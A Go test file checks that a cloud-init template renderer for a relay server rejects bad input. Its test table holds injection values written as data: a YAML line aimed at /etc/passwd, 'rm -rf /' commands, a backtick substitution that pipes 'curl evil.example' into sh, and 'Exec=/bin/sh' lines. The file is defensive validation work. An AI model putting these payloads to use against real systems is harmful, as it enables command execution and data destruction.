package bootstraprelay

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func validData() templateData {
	return templateData{
		Hostname:       "relay.example.test",
		ContactEmail:   "ops@example.test",
		ContainerImage: "ghcr.io/holochain/kitsune2_bootstrap_srv:v0.5.0",
		RustLog:        "warn",
	}
}

func TestRenderCloudInitRejectsBadInput(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*templateData)
		wantMsg string
	}{
		{
			name:    "empty hostname",
			mutate:  func(d *templateData) { d.Hostname = "" },
			wantMsg: "hostname is required",
		},
		{
			name:    "hostname is not fully qualified",
			mutate:  func(d *templateData) { d.Hostname = "relay" },
			wantMsg: "fully qualified",
		},
		{
			name:    "hostname contains a line break",
			mutate:  func(d *templateData) { d.Hostname = "relay.example.test\n    path: /etc/passwd" },
			wantMsg: "fully qualified",
		},
		{
			name:    "hostname has a trailing hyphen in a label",
			mutate:  func(d *templateData) { d.Hostname = "relay-.example.test" },
			wantMsg: "fully qualified",
		},
		{
			name:    "empty contact email",
			mutate:  func(d *templateData) { d.ContactEmail = "" },
			wantMsg: "contactEmail is required",
		},
		{
			name:    "contact email has no domain",
			mutate:  func(d *templateData) { d.ContactEmail = "ops@" },
			wantMsg: "invalid domain",
		},
		{
			name:    "contact email has no local part",
			mutate:  func(d *templateData) { d.ContactEmail = "@example.test" },
			wantMsg: "not a valid email address",
		},
		{
			name:    "contact email contains a line break",
			mutate:  func(d *templateData) { d.ContactEmail = "ops@example.test\nruncmd: [rm -rf /]" },
			wantMsg: "whitespace",
		},
		{
			name:    "contact email uses command substitution",
			mutate:  func(d *templateData) { d.ContactEmail = "`curl${IFS}evil.example|sh`@x.test" },
			wantMsg: "not a valid email address",
		},
		{
			name:    "contact email uses a command separator",
			mutate:  func(d *templateData) { d.ContactEmail = "ops;rm${IFS}-rf${IFS}/@example.test" },
			wantMsg: "not a valid email address",
		},
		{
			name:    "empty container image",
			mutate:  func(d *templateData) { d.ContainerImage = "" },
			wantMsg: "containerImage is required",
		},
		{
			name:    "container image contains a line break",
			mutate:  func(d *templateData) { d.ContainerImage = "img\nExec=/bin/sh" },
			wantMsg: "must not contain line breaks",
		},
		{
			name:    "rust log contains a line break",
			mutate:  func(d *templateData) { d.RustLog = "info\nExec=/bin/sh" },
			wantMsg: "must not contain line breaks",
		},
		{
			name:    "extra arg contains a line break",
			mutate:  func(d *templateData) { d.ExtraArgs = []string{"ok", "bad\nvalue"} },
			wantMsg: "extraArgs[1]",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := validData()
			tt.mutate(&d)

			_, err := renderCloudInit(d)
			if err == nil {
				t.Fatalf("expected an error, got none")
			}
			if !strings.Contains(err.Error(), tt.wantMsg) {
				t.Errorf("error %q does not contain %q", err.Error(), tt.wantMsg)
			}
		})
	}
}

func TestRenderCloudInitAcceptsValidInput(t *testing.T) {
	for _, hostname := range []string{
		"relay.example.test",
		"dev-test-bootstrap2.holochain.org",
		"a.b.c.d.example.test",
	} {
		if _, err := renderCloudInit(templateData{
			Hostname:       hostname,
			ContactEmail:   "ops@example.test",
			ContainerImage: "ghcr.io/holochain/kitsune2_bootstrap_srv:v0.5.0",
			RustLog:        "warn",
		}); err != nil {
			t.Errorf("hostname %q was rejected: %v", hostname, err)
		}
	}
}

// Values that pass validation but contain YAML-significant characters must still
// produce a well-formed document.
func TestRenderedCloudInitIsValidYaml(t *testing.T) {
	got, err := renderCloudInit(templateData{
		Hostname:       "relay.example.test",
		ContactEmail:   "ops@example.test",
		ContainerImage: "ghcr.io/holochain/kitsune2_bootstrap_srv:v0.5.0",
		RustLog:        "info,kitsune2=trace",
		ExtraArgs:      []string{"--listen", "[::]:443"},
	})
	if err != nil {
		t.Fatalf("renderCloudInit: %v", err)
	}

	var doc struct {
		WriteFiles []struct {
			Path        string `yaml:"path"`
			Content     string `yaml:"content"`
			Permissions string `yaml:"permissions"`
		} `yaml:"write_files"`
		Runcmd []string `yaml:"runcmd"`
	}
	if err := yaml.Unmarshal([]byte(got), &doc); err != nil {
		t.Fatalf("rendered cloud-init is not valid YAML: %v\n%s", err, got)
	}

	if len(doc.WriteFiles) != 2 {
		t.Errorf("expected 2 write_files entries, got %d", len(doc.WriteFiles))
	}
	if len(doc.Runcmd) != 1 {
		t.Errorf("expected 1 runcmd entry, got %d", len(doc.Runcmd))
	}
}
